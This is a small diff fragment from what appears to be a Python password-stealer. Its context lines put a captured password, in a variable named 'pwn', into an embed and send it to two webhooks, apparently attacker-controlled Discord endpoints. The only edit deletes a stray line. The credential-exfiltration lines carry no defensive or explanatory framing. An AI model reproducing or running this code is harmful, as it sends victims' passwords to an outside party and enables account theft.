@@ -21,4 +21,3 @@ embed.add_field(name='Password', value=f"`{pwn}`")
 embed.set_footer(text='flewwww',icon_url = "https://www.youtube.com/channel/UC3iEMe2QCVTAp5whTdG0Y5g")
 hook.send(embed=embed)
 web.send(embed=embed)
-hh
